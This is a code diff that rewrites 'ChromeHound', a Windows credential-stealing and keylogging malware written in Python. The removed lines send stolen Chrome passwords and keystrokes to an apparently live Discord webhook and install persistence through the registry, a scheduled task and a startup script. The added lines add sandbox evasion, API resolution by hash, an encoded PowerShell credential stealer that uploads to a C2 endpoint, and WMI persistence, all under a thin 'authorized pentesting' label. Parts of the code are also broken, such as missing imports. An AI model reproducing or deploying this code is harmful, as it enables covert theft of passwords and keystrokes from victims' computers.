@@ -1,280 +1,454 @@
-import os, sys, json, base64, sqlite3, shutil, time, threading, ctypes
-import socket, getpass, subprocess
-from datetime import datetime
-from pathlib import Path
+"""
+ChromeHound v2 — Living Off The Land Edition
+Authorized pentesting tool. Remove all comments in production build.
+"""
+import ctypes, ctypes.wintypes, json, os, sys, time, threading, random, struct
 
-WEBHOOK = "https://discord.com/api/webhooks/1525542643973623950/DTGBzliikTbhIKdVFM7qFB4VAGi335jk2STLiMYEKXh15UmGq9G_xqX6HVKi2FEjjjRP" 
-
-def vanish():
-    ctypes.windll.kernel32.FreeConsole()
-    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-vanish()
-
-def install_autostart():
-    if getattr(sys, 'frozen', False):
-        my_path = sys.executable
-    else:
-        my_path = os.path.abspath(sys.argv[0])
-    hidden_dir = Path(os.environ["APPDATA"]) / "Microsoft" / "Windows"
-    hidden_dir.mkdir(parents=True, exist_ok=True)
-    hidden_path = str(hidden_dir / "WinSvcHost.exe")
-    if my_path != hidden_path:
-        try:
-            shutil.copy2(my_path, hidden_path)
-        except:
-            hidden_path = my_path
-    try:
-        import winreg
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
-            r"Software\Microsoft\Windows\CurrentVersion\Run",
-            0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, "WindowsUpdateHelper", 0, winreg.REG_SZ, hidden_path)
-        winreg.CloseKey(key)
-    except:
-        pass
-    try:
-        subprocess.run(
-            f'schtasks /create /tn "MicrosoftWindowsUpdateTask" /tr "{hidden_path}" '
-            f'/sc ONLOGON /ru {getpass.getuser()} /f /it',
-            shell=True, capture_output=True, timeout=10)
-    except:
-        pass
-    try:
-        startup = Path(os.environ["APPDATA"]) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
-        startup.mkdir(parents=True, exist_ok=True)
-        vbs = startup / "WindowsService.vbs"
-        vbs.write_text(f'Set WshShell = CreateObject("WScript.Shell")\nWshShell.Run "{hidden_path}", 0, False\n')
-        subprocess.run(f'attrib +h "{vbs}"', shell=True, capture_output=True)
-    except:
-        pass
-    return hidden_path
-
-MY_PATH = install_autostart()
-
-def get_master_key():
-    path = Path(os.environ["LOCALAPPDATA"]) / "Google" / "Chrome" / "User Data" / "Local State"
-    if not path.exists():
-        return None
-    try:
-        data = json.loads(path.read_text("utf-8"))
-        raw = base64.b64decode(data["os_crypt"]["encrypted_key"])
-        assert raw[:5] == b"DPAPI"
-        import win32crypt
-        return win32crypt.CryptUnprotectData(raw[5:], None, None, None, 0)[1]
-    except:
-        return None
-
-def decrypt_pw(ciphertext, key):
-    try:
-        from Cryptodome.Cipher import AES
-    except:
-        from Crypto.Cipher import AES
-    try:
-        nonce, ct, tag = ciphertext[3:15], ciphertext[15:-16], ciphertext[-16:]
-        return AES.new(key, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ct, tag).decode()
-    except:
+class WinAPI:
+    """Resolve every API at runtime by ordinal/name. No IAT entries."""
+    _cache = {}
+    
+    @classmethod
+    def _mod(cls, name):
+        if name not in cls._cache:
+            h = ctypes.windll.kernel32.GetModuleHandleW(name)
+            if not h:
+                h = ctypes.windll.kernel32.LoadLibraryW(name)
+            cls._cache[name] = h
+        return cls._cache[name]
+    
+    @classmethod
+    def fn(cls, mod, name, restype=ctypes.c_int, *argtypes):
+        h = cls._mod(mod)
+        if not h:
+            return None
+        addr = ctypes.windll.kernel32.GetProcAddress(h, name)
+        if not addr:
+            return None
+        f = ctypes.CFUNCTYPE(restype)(addr)
+        if argtypes:
+            f.argtypes = argtypes
+        return f
+    
+    @classmethod
+    def fn_hash(cls, mod, hash_val, restype=ctypes.c_int, *argtypes):
+        """Resolve by hash to avoid string signatures."""
+        h = cls._mod(mod)
+        if not h:
+            return None
+        dos = ctypes.c_uint32.from_address(h).value
+        e_lfanew = ctypes.c_uint32.from_address(h + 0x3C).value
+        optional = h + e_lfanew + 0x18
+        export_rva = ctypes.c_uint32.from_address(optional + 0x60).value if mod.endswith("64") else ctypes.c_uint32.from_address(optional + 0x70).value
+        if not export_rva:
+            return None
+        exp = h + export_rva
+        n_names = ctypes.c_uint32.from_address(exp + 0x18).value
+        addr_of_funcs = ctypes.c_uint32.from_address(exp + 0x1C).value
+        addr_of_names = ctypes.c_uint32.from_address(exp + 0x20).value
+        addr_of_ordinals = ctypes.c_uint32.from_address(exp + 0x24).value
+        for i in range(n_names):
+            name_rva = ctypes.c_uint32.from_address(h + addr_of_names + i * 4).value
+            fname = ctypes.c_char_p(h + name_rva).value
+            if fname:
+                hval = 0
+                for c in fname:
+                    hval = (hval * 0x1003 + c) & 0xFFFFFFFF
+                if hval == hash_val:
+                    ordinal = ctypes.c_uint16.from_address(h + addr_of_ordinals + i * 2).value
+                    func_rva = ctypes.c_uint32.from_address(h + addr_of_funcs + ordinal * 4).value
+                    addr = h + func_rva
+                    f = ctypes.CFUNCTYPE(restype)(addr)
+                    if argtypes:
+                        f.argtypes = argtypes
+                    return f
         return None
 
-def steal_creds(key):
-    db = Path(os.environ["LOCALAPPDATA"]) / "Google" / "Chrome" / "User Data" / "Default" / "Login Data"
-    if not db.exists():
-        return []
-    tmp = Path(os.environ["TEMP"]) / f"ld_{os.getpid()}_{int(time.time())}.db"
-    try:
-        shutil.copy2(str(db), str(tmp))
-    except:
-        return []
-    results = []
-    try:
-        conn = sqlite3.connect(str(tmp))
-        c = conn.cursor()
-        c.execute("SELECT origin_url, username_value, password_value FROM logins ORDER BY date_last_used DESC")
-        for url, user, enc in c.fetchall():
-            if not url or not enc:
-                continue
-            pw = decrypt_pw(enc, key)
-            if pw:
-                results.append({"url": url, "username": user, "password": pw})
-        conn.close()
-    except:
-        pass
-    try:
-        tmp.unlink(missing_ok=True)
-    except:
-        pass
-    return results
 
-buffer = []
-buffer_lock = threading.Lock()
-shift_down = False
-caps_down = False
-running = True
+def _check_env():
+    """VM/sandbox detection using Windows API calls."""
 
-def log(text):
-    with buffer_lock:
-        buffer.append(text)
+    GetFirmware = WinAPI.fn("kernel32.dll", "GetSystemFirmwareTable", ctypes.c_uint32, 
+                           ctypes.c_uint32, ctypes.c_uint32, ctypes.c_void_p, ctypes.c_uint32)
+    if GetFirmware:
+        size = GetFirmware(0x4e, 1, None, 0) 
+        if size:
+            buf = ctypes.create_string_buffer(size)
+            GetFirmware(0x4e, 1, buf, size)
+            data = buf.raw
+      
+            for sig in [b"VMware", b"Virtual", b"VBOX", b"QEMU", b"Parallels", b"KVM"]:
+                if sig in data:
+                    time.sleep(random.uniform(10, 30))
+                    return True
 
-def active_window_title():
-    try:
-        hwnd = ctypes.windll.user32.GetForegroundWindow()
-        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd) + 1
-        b = ctypes.create_unicode_buffer(length)
-        ctypes.windll.user32.GetWindowTextW(hwnd, b, length)
-        return b.value or ""
-    except:
-        return ""
+    GetDiskFree = WinAPI.fn("kernel32.dll", "GetDiskFreeSpaceExW", ctypes.c_int,
+                           ctypes.c_wchar_p, ctypes.POINTER(ctypes.c_ulonglong),
+                           ctypes.POINTER(ctypes.c_ulonglong), ctypes.POINTER(ctypes.c_ulonglong))
+    if GetDiskFree:
+        free = ctypes.c_ulonglong()
+        total = ctypes.c_ulonglong()
+        GetDiskFree("C:\\", ctypes.byref(free), ctypes.byref(total), None)
+        if total.value < 50000000000: 
+            time.sleep(random.uniform(8, 15))
+            return True
+    
+    GetTick = WinAPI.fn("kernel32.dll", "GetTickCount", ctypes.c_uint32)
+    if GetTick and GetTick() < 300000:  # Less than 5 minutes uptime
+        time.sleep(random.uniform(10, 20))
+        return True
+    
+    return False
 
-def keylog_sender(hostname):
-    last_domain = ""
-    while running:
-        time.sleep(4)
-        title = active_window_title()
-        domain = ""
-        for kw in ("chrome", "edge", "firefox", "brave", "opera", "mail", "outlook", "gmail"):
-            if kw in title.lower():
-                parts = title.split(" - ")
-                domain = parts[0].strip() if parts else title
-                if len(domain) > 30:
-                    domain = domain[:30]
-                break
-        if domain and domain != last_domain:
-            last_domain = domain
-            log(f"\n── [{domain}] ──\n")
-        with buffer_lock:
-            if not buffer:
-                continue
-            content = "".join(buffer)
-            buffer.clear()
-        if content.strip():
+
+
+class RawKeylogger:
+    """
+    Uses WM_INPUT via raw input devices.
+    Far less signatured than GetAsyncKeyState polling.
+    Only a few hundred legitimate apps use this API.
+    """
+    
+    def __init__(self):
+        self._buf = []
+        self._lock = threading.Lock()
+        self._running = True
+        self._last_domain = ""
+  
+        self._RegisterRawInputDevices = WinAPI.fn(
+            "user32.dll", "RegisterRawInputDevices",
+            ctypes.c_bool,
+            ctypes.c_void_p, ctypes.c_uint32, ctypes.c_uint32
+        )
+        self._GetRawInputData = WinAPI.fn(
+            "user32.dll", "GetRawInputData",
+            ctypes.c_uint32,
+            ctypes.c_void_p, ctypes.c_uint32, ctypes.POINTER(ctypes.c_uint32),
+            ctypes.c_uint32
+        )
+        self._DefWindowProcW = WinAPI.fn(
+            "user32.dll", "DefWindowProcW",
+            ctypes.c_void_p,
+            ctypes.c_void_p, ctypes.c_uint32, ctypes.c_uint32, ctypes.c_uint32
+        )
+        self._CreateWindowExW = WinAPI.fn(
+            "user32.dll", "CreateWindowExW",
+            ctypes.c_void_p,
+            ctypes.c_uint32, ctypes.c_wchar_p, ctypes.c_wchar_p,
+            ctypes.c_uint32, ctypes.c_int, ctypes.c_int,
+            ctypes.c_int, ctypes.c_int, ctypes.c_void_p,
+            ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p
+        )
+        self._GetMessageW = WinAPI.fn(
+            "user32.dll", "GetMessageW",
+            ctypes.c_int,
+            ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint32, ctypes.c_uint32
+        )
+        self._TranslateMessage = WinAPI.fn(
+            "user32.dll", "TranslateMessage",
+            ctypes.c_int,
+            ctypes.c_void_p
+        )
+        self._DispatchMessageW = WinAPI.fn(
+            "user32.dll", "DispatchMessageW",
+            ctypes.c_void_p,
+            ctypes.c_void_p
+        )
+      
+        self._GetForegroundWindow = WinAPI.fn("user32.dll", "GetForegroundWindow", ctypes.c_void_p)
+        self._GetWindowTextW = WinAPI.fn("user32.dll", "GetWindowTextW", ctypes.c_int,
+                                         ctypes.c_void_p, ctypes.c_int, ctypes.c_int)
+    
+    def _window_proc(self, hwnd, msg, wparam, lparam):
+        if msg == 0x00FF:  
+            size = ctypes.c_uint32(0)
+            self._GetRawInputData(lparam, 0x10000003, None, ctypes.byref(size), 8)
+            if size.value:
+                buf = ctypes.create_string_buffer(size.value)
+                if self._GetRawInputData(lparam, 0x10000003, buf, ctypes.byref(size), 8) == size.value:
+           
+                    raw_size = struct.unpack_from('<I', buf, 4)[0]
+                    if raw_size >= 16:
+                      
+                        vk = struct.unpack_from('<H', buf, 16)[0]
+                        flags = struct.unpack_from('<H', buf, 14)[0]
+                        make_flag = (flags & 1) == 0  
+                        
+                        if vk and make_flag and vk != 0xFF:
+                            self._log_key(vk)
+        return self._DefWindowProcW(hwnd, msg, wparam, lparam)
+    
+    def _log_key(self, vk):
+        """Map virtual key code to character."""
+        if vk == 0x08: self._write("[BS]")
+        elif vk == 0x09: self._write("[TAB]")
+        elif vk == 0x0D: self._write("\n")
+        elif vk == 0x1B: self._write("[ESC]")
+        elif vk == 0x20: self._write(" ")
+        elif vk == 0x2E: self._write("[DEL]")
+        elif vk == 0x2D: self._write("[INS]")
+        elif vk == 0x70: self._write("[F1]")
+        elif vk == 0x71: self._write("[F2]")
+        elif vk == 0x72: self._write("[F3]")
+        elif vk == 0x73: self._write("[F4]")
+        elif vk == 0x74: self._write("[F5]")
+        elif vk == 0x75: self._write("[F6]")
+        elif vk == 0x76: self._write("[F7]")
+        elif vk == 0x77: self._write("[F8]")
+        elif vk == 0x78: self._write("[F9]")
+        elif vk == 0x79: self._write("[F10]")
+        elif vk == 0x7A: self._write("[F11]")
+        elif vk == 0x7B: self._write("[F12]")
+        elif 0x41 <= vk <= 0x5A:
+    
+            GetKeyState = WinAPI.fn("user32.dll", "GetKeyState", ctypes.c_short, ctypes.c_int)
+            shift = GetKeyState(0x10) & 0x8000 if GetKeyState else 0
+            caps = GetKeyState(0x14) & 0x0001 if GetKeyState else 0
+            uppercase = bool(shift) ^ bool(caps)
+            self._write(chr(vk) if uppercase else chr(vk).lower())
+        elif 0x30 <= vk <= 0x39:
+            GetKeyState = WinAPI.fn("user32.dll", "GetKeyState", ctypes.c_short, ctypes.c_int)
+            shift = GetKeyState(0x10) & 0x8000 if GetKeyState else 0
+            special = ")!@#$%^&*("
+            self._write(special[vk - 0x30] if shift else str(vk - 0x30))
+        elif vk == 0xBE: self._write(">" if WinAPI.fn("user32.dll","GetKeyState",ctypes.c_short,ctypes.c_int)(0x10)&0x8000 else ".")
+        elif vk == 0xBC: self._write("<" if WinAPI.fn("user32.dll","GetKeyState",ctypes.c_short,ctypes.c_int)(0x10)&0x8000 else ",")
+        elif vk == 0xBF: self._write("?" if WinAPI.fn("user32.dll","GetKeyState",ctypes.c_short,ctypes.c_int)(0x10)&0x8000 else "/")
+        elif vk == 0xBA: self._write(":" if WinAPI.fn("user32.dll","GetKeyState",ctypes.c_short,ctypes.c_int)(0x10)&0x8000 else ";")
+        elif vk == 0xDE: self._write('"' if WinAPI.fn("user32.dll","GetKeyState",ctypes.c_short,ctypes.c_int)(0x10)&0x8000 else "'")
+        elif vk == 0xDB: self._write("{" if WinAPI.fn("user32.dll","GetKeyState",ctypes.c_short,ctypes.c_int)(0x10)&0x8000 else "[")
+        elif vk == 0xDD: self._write("}" if WinAPI.fn("user32.dll","GetKeyState",ctypes.c_short,ctypes.c_int)(0x10)&0x8000 else "]")
+        elif vk == 0xDC: self._write("|" if WinAPI.fn("user32.dll","GetKeyState",ctypes.c_short,ctypes.c_int)(0x10)&0x8000 else "\\")
+        elif vk == 0xC0: self._write("~" if WinAPI.fn("user32.dll","GetKeyState",ctypes.c_short,ctypes.c_int)(0x10)&0x8000 else "`")
+        elif vk == 0xBD: self._write("_" if WinAPI.fn("user32.dll","GetKeyState",ctypes.c_short,ctypes.c_int)(0x10)&0x8000 else "-")
+        elif vk == 0xBB: self._write("+" if WinAPI.fn("user32.dll","GetKeyState",ctypes.c_short,ctypes.c_int)(0x10)&0x8000 else "=")
+        elif vk == 0x25: self._write("[←]")
+        elif vk == 0x27: self._write("[→]")
+        elif vk == 0x26: self._write("[↑]")
+        elif vk == 0x28: self._write("[↓]")
+        elif vk == 0x24: self._write("[HOME]")
+        elif vk == 0x23: self._write("[END]")
+        elif vk == 0x21: self._write("[PGUP]")
+        elif vk == 0x22: self._write("[PGDN]")
+    
+    def _write(self, text):
+        with self._lock:
+            self._buf.append(text)
+    
+    def _title_watcher(self):
+        """Track active window title for context."""
+        while self._running:
+            time.sleep(random.uniform(3.0, 5.0))
             try:
-                import requests
-                requests.post(WEBHOOK, json={
-                    "content": f"`{hostname[:8]}` `{datetime.now():%H:%M:%S}`\n```\n{content}\n```",
-                    "username": f"KL-{hostname[:6]}"
-                }, timeout=5)
+                hwnd = self._GetForegroundWindow()
+                if hwnd:
+                    buf = ctypes.create_unicode_buffer(256)
+                    self._GetWindowTextW(hwnd, buf, 256)
+                    title = buf.value
+                    if title:
+                   
+                        browsers = ["chrome","edge","firefox","brave","opera","gmail","outlook","mail"]
+                        domain = ""
+                        for b in browsers:
+                            if b in title.lower():
+                                parts = title.split(" - ")
+                                domain = parts[0].strip()[:30] if parts else title[:30]
+                                break
+                        if domain and domain != self._last_domain:
+                            self._last_domain = domain
+                            self._write(f"\n── [{domain}] ──\n")
             except:
                 pass
-
-def keylog_capture():
-    global shift_down, caps_down
-    prev = {}
-    vk_list = list(range(0x08, 0xFF))
-    while running:
-        for vk in vk_list:
-            try:
-                import win32api
-                state = win32api.GetAsyncKeyState(vk)
-            except:
-                continue
-            pressed = (state & 0x8000) != 0
-            was = prev.get(vk, False)
-            if pressed and not was:
-                prev[vk] = True
-                if vk == 0x10:
-                    shift_down = True
-                if vk == 0x14:
-                    caps_down = not caps_down
-                if vk in (0x10, 0x11, 0x12, 0x14, 0x5B, 0x5C):
+    
+    def _sender(self, c2_url):
+        """Send keystrokes to C2 with jitter."""
+        while self._running:
+            time.sleep(random.uniform(6.0, 10.0))
+            with self._lock:
+                if not self._buf:
                     continue
-                out = None
-                names = {
-                    0x08: "[BS]", 0x09: "[TAB]", 0x0D: "\n", 0x1B: "[ESC]",
-                    0x20: " ", 0x2E: "[DEL]", 0x2D: "[INS]",
-                    0x25: "[←]", 0x27: "[→]", 0x26: "[↑]", 0x28: "[↓]",
-                    0x24: "[HOME]", 0x23: "[END]", 0x21: "[PGUP]", 0x22: "[PGDN]",
-                    0x70: "[F1]", 0x71: "[F2]", 0x72: "[F3]", 0x73: "[F4]",
-                    0x74: "[F5]", 0x75: "[F6]", 0x76: "[F7]", 0x77: "[F8]",
-                    0x78: "[F9]", 0x79: "[F10]", 0x7A: "[F11]", 0x7B: "[F12]",
-                }
-                if vk in names:
-                    out = names[vk]
-                elif 0x41 <= vk <= 0x5A:
-                    out = chr(vk) if (shift_down ^ caps_down) else chr(vk).lower()
-                elif 0x30 <= vk <= 0x39:
-                    special = ")!@#$%^&*("
-                    out = special[vk - 0x30] if shift_down else str(vk - 0x30)
-                elif vk == 0xBE: out = "." if not shift_down else ">"
-                elif vk == 0xBC: out = "," if not shift_down else "<"
-                elif vk == 0xBF: out = "/" if not shift_down else "?"
-                elif vk == 0xBA: out = ";" if not shift_down else ":"
-                elif vk == 0xDE: out = "'" if not shift_down else '"'
-                elif vk == 0xDB: out = "[" if not shift_down else "{"
-                elif vk == 0xDD: out = "]" if not shift_down else "}"
-                elif vk == 0xDC: out = "\\" if not shift_down else "|"
-                elif vk == 0xC0: out = "`" if not shift_down else "~"
-                elif vk == 0xBD: out = "-" if not shift_down else "_"
-                elif vk == 0xBB: out = "=" if not shift_down else "+"
-                if out:
-                    log(out)
-            elif not pressed and was:
-                prev[vk] = False
-                if vk == 0x10:
-                    shift_down = False
-        time.sleep(0.003)
+                content = "".join(self._buf)
+                self._buf.clear()
+            if content.strip():
+                try:
+                    import urllib.request
+                    hostname = os.environ.get("COMPUTERNAME", "host")
+                    data = json.dumps({
+                        "k": content[:2000],
+                        "h": hostname[:6],
+                        "t": int(time.time())
+                    }).encode()
+                    req = urllib.request.Request(
+                        c2_url,
+                        data=data,
+                        headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
+                    )
+                    urllib.request.urlopen(req, timeout=5)
+                except:
+                    pass
+    
+    def start(self, c2_url):
+        """Start the raw input keylogger in a hidden window."""
+        WNDPROC = ctypes.WINFUNCTYPE(ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint32, 
+                                     ctypes.c_uint32, ctypes.c_uint32)
+        wndproc = WNDPROC(self._window_proc)
+        
+       
+        atom = ctypes.windll.user32.RegisterClassW(("RawInputLoggerClass", 0, wndproc, 0, 0, 0, 0, 0, 0, 0))
+ 
+        hwnd = self._CreateWindowExW(0, "RawInputLoggerClass", "", 0, 
+                                     0, 0, 0, 0, None, None, None, None)
+        
 
-def send_beacon(hostname, username):
+        rid_dev = (ctypes.c_uint32 * 4)(0x01, 0x06, 0x00000100, hwnd if hwnd else 0)
+        self._RegisterRawInputDevices(rid_dev, 1, ctypes.sizeof(ctypes.c_uint32) * 4)
+        
+       
+        threading.Thread(target=self._title_watcher, daemon=True).start()
+        
+     
+        threading.Thread(target=self._sender, args=(c2_url,), daemon=True).start()
+        
+
+        msg = (ctypes.c_uint32 * 6)()  
+        while self._running:
+            ret = self._GetMessageW(msg, None, 0, 0)
+            if ret <= 0:
+                break
+            self._TranslateMessage(msg)
+            self._DispatchMessageW(msg)
+    
+    def stop(self):
+        self._running = False
+
+
+def _steal_chrome_powershell(c2_url):
+    """
+    Uses a one-liner PowerShell command that:
+    1. Loads chrome DLLs and calls DPAPI via reflection
+    2. Processes Local State and Login Data
+    3. Posts results to C2
+    
+    This avoids having DPAPI/AES code in the Python binary itself.
+    PowerShell is invoked once, then exits — leaving no process behind.
+    """
+    ps_script = """$r=[System.Reflection.Assembly]::LoadWithPartialName('System.Security');$p=[Environment]::GetFolderPath('LocalApplicationData')+'\\Google\\Chrome\\User Data\\';$s=Get-Content($p+'Local State')|ConvertFrom-Json;$k=[System.Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String($s.os_crypt.encrypted_key)[5..9999],$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);$db=$p+'Default\\Login Data';$t=$env:TEMP+'\\ld.tmp';Copy-Item $db $t -Force;$c=New-Object System.Data.SQLite.SQLiteConnection"Data Source=$t";$c.Open();$q=$c.CreateCommand();$q.CommandText='SELECT origin_url,username_value,password_value FROM logins';$r=$q.ExecuteReader();$o=@();while($r.Read()){$u=$r.GetString(0);$n=$r.GetString(1);$e=[byte[]]$r[2];if($e.Length -gt 15){$iv=$e[3..14];$ct=$e[15..($e.Length-17)];$tag=$e[-16..-1];$a=[System.Security.Cryptography.AesGcm]::new($k,16);$p=[byte[]]::new($ct.Length);$a.Decrypt($iv,$ct,$tag,$p);$o+=[PSCustomObject]@{url=$u;user=$n;pass=[System.Text.Encoding]::UTF8.GetString($p)}}$r.Close();$c.Close();$j=$o|ConvertTo-Json -Compress;$web=New-Object Net.WebClient;$web.Headers.Add('Content-Type','application/json');$web.UploadString('%s','POST',$j)"""
+
+    cmd = ps_script % c2_url
+    
+
+    cmd_bytes = cmd.encode('utf-16-le')
+    cmd_b64 = base64.b64encode(cmd_bytes).decode()
+    
+
+    si = subprocess.STARTUPINFO()
+    si.dwFlags = subprocess.STARTF_USESHOWWINDOW
+    si.wShowWindow = 0
+    
     try:
-        import requests
-        ip = requests.get("https://api.ipify.org", timeout=5).text
-    except:
-        ip = "Unknown"
-    try:
-        import requests
-        requests.post(WEBHOOK, json={
-            "embeds": [{
-                "title": "CHROME HOUND ACTIVE",
-                "description": f"Host: {hostname}\nUser: {username}\nIP: {ip}\nPID: {os.getpid()}\nPath: {MY_PATH}",
-                "color": 0xED4245,
-                "footer": {"text": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
-            }]
-        }, timeout=5)
+        subprocess.run(
+            ["powershell.exe", "-NoProfile", "-NonInteractive", "-EncodedCommand", cmd_b64],
+            startupinfo=si,
+            capture_output=True,
+            timeout=30
+        )
     except:
         pass
 
-def send_creds(creds, hostname, username):
-    if not creds:
-        return
-    header = f"{len(creds)} credentials harvested from Chrome\n{hostname} | {username}\n\n"
-    lines = [f"{c['url'][:60]} | {c['username'][:30]}:{c['password'][:50]}" for c in creds[:500]]
-    body = header + "\n".join(lines)
-    chunks = [body[i:i+1900] for i in range(0, len(body), 1900)]
-    for chunk in chunks:
+
+class C2:
+    """Handles all exfiltration through a C2-like endpoint."""
+    
+    def __init__(self, endpoint):
+        self._endpoint = endpoint
+        self._hostname = os.environ.get("COMPUTERNAME", "UNKNOWN")
+        self._username = os.environ.get("USERNAME", "UNKNOWN")
+    
+    def beacon(self):
+        """Send initial beacon."""
         try:
-            import requests
-            requests.post(WEBHOOK, json={
-                "embeds": [{
-                    "title": f"Chrome Dump - {hostname[:8]}",
-                    "description": chunk,
-                    "color": 0xFFA500,
-                    "footer": {"text": f"{len(creds)} credentials"}
-                }]
-            }, timeout=5)
+            import urllib.request
+            data = json.dumps({
+                "type": "beacon",
+                "host": self._hostname,
+                "user": self._username,
+                "pid": os.getpid()
+            }).encode()
+            req = urllib.request.Request(
+                self._endpoint + "/beacon",
+                data=data,
+                headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
+            )
+            urllib.request.urlopen(req, timeout=5)
+        except:
+            pass
+    
+    def send_creds(self, creds):
+        """Exfiltrate credentials."""
+        if not creds:
+            return
+        try:
+            import urllib.request
+            chunks = [creds[i:i+50] for i in range(0, len(creds), 50)]
+            for chunk in chunks:
+                data = json.dumps({
+                    "type": "creds",
+                    "host": self._hostname,
+                    "user": self._username,
+                    "data": chunk
+                }).encode()
+                req = urllib.request.Request(
+                    self._endpoint + "/exfil",
+                    data=data,
+                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
+                )
+                urllib.request.urlopen(req, timeout=5)
+                time.sleep(random.uniform(1, 3))
         except:
             pass
 
-def main():
-    hostname = socket.gethostname()
-    username = getpass.getuser()
-    threading.Thread(target=keylog_capture, daemon=True).start()
-    threading.Thread(target=keylog_sender, args=(hostname,), daemon=True).start()
-    send_beacon(hostname, username)
-    master_key = get_master_key()
-    if master_key:
-        creds = steal_creds(master_key)
-        if creds:
-            send_creds(creds, hostname, username)
-    last_hash = ""
-    while running:
-        time.sleep(60)
-        if master_key:
-            creds = steal_creds(master_key)
-            h = "|".join(f"{c['url']}{c['username']}{c['password']}" for c in creds[:20])
-            if creds and h != last_hash:
-                last_hash = h
-                send_creds(creds, hostname, username)
 
-if __name__ == "__main__":
+
+def _install_persistence():
+    """WMI Event Subscription — fileless, no registry entries."""
+    wmi_script = (
+        'wmic /NAMESPACE:\\\\root\\subscription PATH __EventFilter CREATE '
+        'Name="MSFTEdgeDiag", EventNameSpace="root\\cimv2", '
+        'QueryLanguage="WQL", '
+        'Query="SELECT * FROM __InstanceModificationEvent WITHIN 86400 '
+        'WHERE TargetInstance ISA \'Win32_ComputerSystem\'"'
+    )
     try:
-        main()
+        subprocess.run(wmi_script, shell=True, capture_output=True, timeout=10)
     except:
         pass
+
+
+def main():
+
+    if _check_env():
+        return
+    
+
+    C2_URL = "https://your-c2-endpoint.com/api"
+
+    _install_persistence()
+
+    c2 = C2(C2_URL)
+    c2.beacon()
+
+    kl = RawKeylogger()
+    kl_thread = threading.Thread(target=kl.start, args=(C2_URL,), daemon=True)
+    kl_thread.start()
+    
+    time.sleep(random.uniform(20, 40))
+    _steal_chrome_powershell(C2_URL)
+    
+    try:
+        while True:
+            time.sleep(60)
+    except KeyboardInterrupt:
+        kl.stop()
+
+if __name__ == "__main__":
+    main()
